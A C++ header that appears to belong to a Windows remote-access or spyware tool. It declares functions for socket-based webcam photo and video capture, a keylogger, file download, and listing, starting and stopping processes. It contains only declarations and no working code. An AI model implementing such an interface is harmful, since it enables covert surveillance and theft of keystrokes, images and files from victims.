#pragma once
#include <string>
#include <vector>
#include <memory>
#include <thread>
#include <mutex>
#include <fstream>
#include <winsock2.h>
#include <condition_variable>

using std::string;
using std::vector;

void capture_photo(SOCKET conn);
void record_video(SOCKET conn,int duration);

void start_keylogger();
string stop_keylogger();

void download_file(SOCKET conn,const string& path);

string list_apps();
string start_app(const string& app_name);
string stop_app(const string& app_name);

struct ProcessInfo {
    string pid;
    string name;
    string user;
};
vector<ProcessInfo> list_processes();

string start_process(const string& process_path);
string stop_process(const string& process_name);

string shutdown_system();
string restart_system();
